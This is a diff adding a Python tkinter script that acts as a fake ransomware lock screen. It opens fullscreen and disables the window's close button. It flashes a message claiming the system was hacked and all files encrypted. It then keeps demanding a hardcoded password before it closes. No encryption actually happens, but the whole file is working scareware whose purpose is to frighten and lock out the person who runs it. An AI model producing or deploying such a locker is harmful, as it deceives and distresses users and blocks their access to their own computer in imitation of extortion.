@@ -1,0 +1,68 @@
+import tkinter as tk
+from tkinter import simpledialog
+import random
+
+PASSWORD = "Masroorali@1234567"
+
+def disable_event():
+    pass  # Disable close button
+
+def ask_password():
+    user_input = simpledialog.askstring("SECURITY ALERT!", "ENTER PASSWORD TO UNLOCK:", show='*')
+    if user_input == PASSWORD:
+        root.destroy()
+    else:
+        root.after(100, ask_password)
+
+def flash_background():
+    # Randomly switch background between red and black to create flashing effect
+    current_color = root.cget("bg")
+    new_color = "red" if current_color == "black" else "black"
+    root.configure(bg=new_color)
+    label.configure(bg=new_color)
+    root.after(500, flash_background)
+
+def blink_text():
+    # Blink warning text on/off
+    current_color = label.cget("fg")
+    new_color = "black" if current_color == "red" else "red"
+    label.configure(fg=new_color)
+    root.after(700, blink_text)
+
+def type_text(widget, text, delay=50):
+    def inner(i=0):
+        if i <= len(text):
+            widget.config(text=text[:i])
+            root.after(delay, inner, i+1)
+    inner()
+
+root = tk.Tk()
+root.title("!!! SYSTEM HACKED !!!")
+root.attributes('-fullscreen', True)
+root.configure(bg="black")
+root.protocol("WM_DELETE_WINDOW", disable_event)
+root.resizable(False, False)
+
+label = tk.Label(
+    root, 
+    fg="red", 
+    bg="black", 
+    font=("Courier New", 40, "bold"), 
+    justify="center"
+)
+label.pack(expand=True)
+
+message = (
+    "!!! WARNING !!!\n\n"
+    "YOUR SYSTEM HAS BEEN HACKED BY MASROOR ALI!\n"
+    "ALL FILES ENCRYPTED\n"
+    "ENTER PASSWORD TO UNLOCK IMMEDIATELY\n"
+    "OR DATA WILL BE LOST FOREVER\n"
+)
+
+root.after(1000, lambda: type_text(label, message, delay=40))
+root.after(4000, flash_background)
+root.after(4000, blink_text)
+root.after(7000, ask_password)
+
+root.mainloop()
